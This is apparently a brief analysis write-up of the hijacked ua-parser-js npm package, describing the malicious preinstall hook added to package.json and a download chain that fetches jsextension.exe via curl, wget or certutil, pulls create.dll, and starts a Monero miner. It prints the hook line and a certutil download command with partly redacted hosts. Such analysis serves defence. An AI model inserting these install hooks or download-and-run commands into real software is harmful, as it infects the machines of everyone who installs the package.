# ua-parser-vuln

Package.json has the line:
 ""preinstall": "start /B node preinstall.js & node preinstall.js"," added, to call the new attack scripts.
preinstall.js looks to see Windows, mac, linux, and call the correct file

On the linux side: It checks the server IP, if in the RU/UA/BY/KZ geo, does nothing.

Else, it pulls down  jsextention from a remote IP in the Latvia GEO

**If Windows:**
1. Pulls down jsextension.exe  (Server serving is not responding)
2. Tries to curl it down
3. If that doesn work, tries wget
4. If that doesnt work, tries certutil
    it runs â€œcertutil.exe -urlcache -f http://159.XXX.XXX.XXX/download/jsextension.exe jsextension.exe
    
5. Then attempts to pull down create.dll from citation<redaction>.at
    Currently at a russian IP address block
6. Then adds the execute to tasklist , to connect to pool.minexmr.****
